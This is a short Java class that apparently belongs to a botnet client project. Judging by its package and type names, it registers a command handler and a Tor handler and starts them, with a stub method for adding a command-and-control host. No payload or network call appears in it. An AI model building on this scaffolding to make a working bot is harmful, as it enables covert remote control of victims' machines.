package com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.control;

import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.CCHostParam;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.ControlEvent;
import com.github.kvac.pwn.kvacpwnroot.kvac.pwn.libs.events.ControlEvent.CONTROL_TYPE;
import com.github.kvac.pwn.kvacpwnroot.pwnbotsroot.pwn.bot.common.header.CommonHeader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ControllAll {

    Logger logger = LoggerFactory.getLogger(getClass());

    public void register() {
        //register commands
        CommonHeader.getCOMMAND_HANDLER().register();
        //register tor
        CommonHeader.getTOR_HANDLER().register();
    }

    public void init() {
        ControlEvent controlEvent = new ControlEvent();
        controlEvent.setType(CONTROL_TYPE.INIT);

        //COMMAND
        CommonHeader.getEVENT_HEADER().getCommandEventBus().post(controlEvent);
        //TOR
        CommonHeader.getEVENT_HEADER().getTorEventBus().post(controlEvent);
    }

    public void addHost(CCHostParam param) {
        logger.info("addHost");
        logger.info("addHost-ok");
    }

    public void start() {
        ControlEvent controlEvent = new ControlEvent();
        controlEvent.setType(CONTROL_TYPE.START);

        CommonHeader.getEVENT_HEADER().getCommandEventBus().post(controlEvent);//COMMAND
        CommonHeader.getEVENT_HEADER().getTorEventBus().post(controlEvent);//TOR
    }

}
